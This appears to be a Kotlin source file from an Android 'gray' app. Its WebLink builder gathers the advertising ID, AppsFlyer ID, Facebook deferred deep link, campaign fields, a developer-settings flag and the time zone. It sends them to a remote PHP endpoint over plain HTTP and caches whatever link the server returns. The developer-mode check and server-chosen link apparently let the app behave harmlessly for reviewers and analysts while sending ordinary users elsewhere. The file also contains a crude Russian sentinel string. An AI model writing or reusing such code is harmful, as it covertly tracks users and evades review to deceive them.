package com.conboi.gray.data.model

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.conboi.gray.interfaces.CacheLinkRepository
import com.conboi.gray.interfaces.ZeusServiceRepository
import com.conboi.gray.utils.AppIDs
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.onesignal.OneSignal
import java.io.IOException
import java.net.URLEncoder
import java.nio.charset.StandardCharsets
import java.util.*

data class WebLink(val collectedLink: String?) {

    private constructor(builder: Builder) : this(builder.collectedLink)

    class Builder(
        private val context: Context,
        private val zeusServiceRepositoryImpl: ZeusServiceRepository,
        private val cacheLinkRepositoryImpl: CacheLinkRepository
    ) {
        var collectedLink: String? = null

        private var googleId: String? = null
        private var appsFlyerUserId: String? = null

        private var deepLink: String? = null

        private var mediaSource: String? = null
        private var afChannel: String? = null
        private var campaign: String? = null

        fun init():String? {
            val cacheLink = cacheLinkRepositoryImpl.getLink()
            return cacheLink.ifBlank {
                beginWork()
                null
            }
        }

        private fun beginWork() {
            setDeepLink()
            setAppIds()
        }


        private fun setDeepLink() {
            FacebookSdk.setAutoInitEnabled(true)
            FacebookSdk.fullyInitialize()
            AppLinkData.fetchDeferredAppLinkData(context) {
                val link = it?.targetUri.toString()
                deepLink = URLEncoder.encode(link, StandardCharsets.UTF_8.toString())
            }
        }


        private fun setAppIds() {
            Thread {
                try {
                    AppIDs(context).let {
                        appsFlyerUserId = it.afId
                        googleId = it.googleId
                        OneSignal.setExternalUserId(this.googleId.toString())
                    }
                } catch (exception: IOException) {
                } catch (exception: GooglePlayServicesRepairableException) {
                } catch (exception: GooglePlayServicesNotAvailableException) {
                }
            }.start()
        }


        fun build(): WebLink {
            val getAdb: Int = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            )
            val adb: Boolean = getAdb != 0
            val getTmz: String = TimeZone.getDefault().id.lowercase()
            val tmz = URLEncoder.encode(getTmz, "utf-8")

            val strRootUrl = "http://zeuspower.cfd/zeus.php"
            val strGoogleId = "?google_adid_zeus="
            val strAfId = "&af_userid_zeus="
            val strDeepLink = "&fb_deeplink_zeus="
            val strCampaign = "&campaign_zeus="
            val strAfChannel = "&af_channel="
            val strMediaSource = "&media_source_zeus="
            val strAdb = "&adb_zeus="
            val strTmz = "&tmz_zeus="

            val buildRequestUrl = strRootUrl +
                    strGoogleId + googleId +
                    strAfId + appsFlyerUserId +
                    strDeepLink + deepLink + //encode
                    strCampaign + campaign +
                    strAfChannel + afChannel +
                    strMediaSource + mediaSource +
                    strAdb + adb + //true or false
                    strTmz + tmz //encode


            collectedLink = zeusServiceRepositoryImpl.getLink(buildRequestUrl)
            Log.d("TAG", "build: $collectedLink")
            if(collectedLink != "poshel nahui"){
                cacheLinkRepositoryImpl.saveLink(collectedLink!!)
            }else{
                collectedLink = null
            }
            return WebLink(this)
        }

        inner class Af {
            fun setCampaign(value: String) {
                this@Builder.campaign = value
            }

            fun setMediaSource(value: String) {
                this@Builder.mediaSource = value
            }

            fun setAfChannel(value: String) {
                this@Builder.afChannel = value
            }
        }
    }
}
